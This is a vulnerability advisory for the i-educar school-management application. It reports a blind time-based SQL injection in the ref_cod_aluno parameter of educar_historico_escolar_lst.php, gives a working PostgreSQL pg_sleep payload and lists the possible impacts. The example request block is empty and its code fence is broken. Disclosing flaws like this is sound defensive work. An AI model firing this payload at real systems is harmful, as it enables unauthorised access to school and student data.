# SQL Injection (Blind Time-Based) Vulnerability in ref_cod_aluno Parameter on educar_historico_escolar_lst.php Endpoint

---

## Summary

A SQL Injection vulnerability was identified in the `educar_historico_escolar_lst.php` endpoint of the _i-educar_ application, specifically in the `ref_cod_aluno` parameter. This vulnerability allows attackers to execute arbitrary SQL commands on the backend database, potentially compromising the confidentiality, integrity, and availability of application data.

---

## Details

**Vulnerable Endpoint:** `/educar_historico_escolar_lst.php`  
**Parameter:** `ref_cod_aluno`

The application fails to properly validate and sanitize user input in the `ref_cod_aluno` parameter. As a result, attackers can inject crafted SQL payloads that are executed directly by the database. This may allow database enumeration, data exfiltration, modification, or denial of service via time-based delays.

## PoC

**Payload:**

 `AND 6986=(SELECT 6986 FROM PG_SLEEP(5))`

This payload introduces a **5-second time delay** in the server response, confirming that the parameter is vulnerable to blind time-based SQL injection.

**Example Request:**

```

The delayed response demonstrates that the injected SQL command was successfully executed by the backend database.

## Impact

- **Unauthorized data access:** Retrieving sensitive information such as credentials, personal data, or configuration details
    
- **Database enumeration:** Extracting schema names, tables, and column structures
    
- **Data manipulation:** Inserting, updating, or deleting database records
    
- **Denial of Service (DoS):** Using time-based injections to disrupt application availability
    
- **Potential privilege escalation or RCE:** Depending on database configuration and available functions
    

This vulnerability could lead to full compromise of the database and exposure of sensitive application and user data.
